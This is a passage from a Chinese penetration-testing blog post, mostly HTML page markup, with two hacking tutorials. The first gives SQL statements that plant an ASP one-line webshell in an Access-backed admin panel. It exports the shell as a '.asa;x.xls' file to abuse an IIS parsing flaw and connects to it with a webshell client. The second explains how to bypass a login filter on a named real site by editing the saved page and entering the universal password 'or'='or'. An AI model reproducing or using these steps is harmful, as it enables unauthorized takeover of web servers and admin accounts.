+<h2 id="0x16-ACCESS执行SQL语句导出一句话拿webshell"><a href="#0x16-ACCESS执行SQL语句导出一句话拿webshell" class="headerlink" title="0x16 ACCESS执行SQL语句导出一句话拿webshell"></a>0x16 ACCESS执行SQL语句导出一句话拿webshell</h2><p>原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。<br>不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。<br>点“服务器信息探测”，获得网站路径：e:\web\webshellcc\的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。<br>create table cmd (a varchar(50))  建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50<br>insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’)  在表cmd的a字段插入密码为#的一句话木马<br>select * into [a] in ‘e:\web\webshellcc\1.asa;x.xls’ ‘excel 4.0;’ from cmd  把cmd表a的内容导出到路径e:\web\webshellcc\的EXCEL文件<br>drop table cmd  删除建立的cmd表<br>菜刀连接：<a href="http://www.xxx.com/1.asa;x.xls" target="_blank" rel="external">http://www.xxx.com/1.asa;x.xls</a></p>
+<h2 id="0x17-利用过滤’or’-’or’修改代码进行绕过"><a href="#0x17-利用过滤’or’-’or’修改代码进行绕过" class="headerlink" title="0x17 利用过滤’or’=’or’修改代码进行绕过"></a>0x17 利用过滤’or’=’or’修改代码进行绕过</h2><p>例如后台地址是：<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="external">http://www.hdminc.net/admin/admin_index.asp</a><br>当用万能密码登录的时候，会出现一些过滤or的提示！<br>请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！</p>
+<pre><code>&lt;script language=&quot;javascript&quot;&gt;
+function chencklogin()
+{
+  if(document.login.username.value==&apos;&apos;)
+     {alert(&apos;请输入用户名&apos;);
+      document.login.username.focus();
+      return false
+    }
+  if (document.login.password.value==&apos;&apos;)
+   {alert(&apos;请输入密码&apos;);
+    document.login.password.focus();
+    return false
+   }
+}
+&lt;/script&gt;
+</code></pre><p>注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="external">http://www.hdminc.net/admin/admin_index.asp</a>“</p>
+<p>&lt;form action=”index.asp?action=chkadmin” name=”login” method=”past” onsubmit=return checklogin();”&gt;<br>最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/渗透学习/">渗透学习</a>
+  </div>
+
+        <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone"></a>
+    <a href="#" class="bds_tsina" data-cmd="tsina"></a>
+    <a href="#" class="bds_tqq" data-cmd="tqq"></a>
+    <a href="#" class="bds_renren" data-cmd="renren"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin"></a>
+</div>
+
+<script>
+    window._bd_share_config = {
+        "common": {
+            "bdSnsKey": {},
+            "bdText": "",
+            "bdMini": "2",
+            "bdPic": "",
+            "bdStyle": "0",
+            "bdSize": "16"
+        },
+        "share": {},
+        "image": {
+            "viewList": ["qzone", "tsina", "tqq", "renren", "weixin"],
+            "viewText": “分享到",
+            "viewSize": "16"
+        },
+        "selectShare": {
+            "bdContainerClass": null,
+            "bdSelectMiniList": ["qzone", "tsina", "tqq", "renren", "weixin"]
+        }
+    };
+    with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/02/15/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <SCRIPT language=javascript>
+function search(formname) {
+    formname.method = "get";
+    formname.action = "http://www.baidu.com/baidu";
+    document.search_form.word.value = document.search_form.word.value + " site:mjiayou.com";
+    return true;
+}
+</SCRIPT>
+
+<div class="search">
+    <form name="search_form" target="_blank" onsubmit="search(this)">
+        <input type="search" name="word" results="0" placeholder="百度站内搜索" onblur="this.value=''">
+        <!-- <input type="submit" value="搜索"> -->
+    </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Linux基础/">Linux基础</a><small>3</small></li>
+  
+    <li><a href="/tags/php/">php</a><small>1</small></li>
+  
+    <li><a href="/tags/python/">python</a><small>3</small></li>
+  
+    <li><a href="/tags/渗透学习/">渗透学习</a><small>7</small></li>
+  
+    <li><a href="/tags/生活感悟/">生活感悟</a><small>2</small></li>
+  
+    <li><a href="/tags/读书笔记/">读书笔记</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  <iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=1&ptype=1&speed=0&skin=3&isTitle=0&noborder=1&isWeibo=0&isFans=0&uid=3869837461&verifier=7b3bd9e7&dpc=1"></iframe>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 xiaofeng
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.useso.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
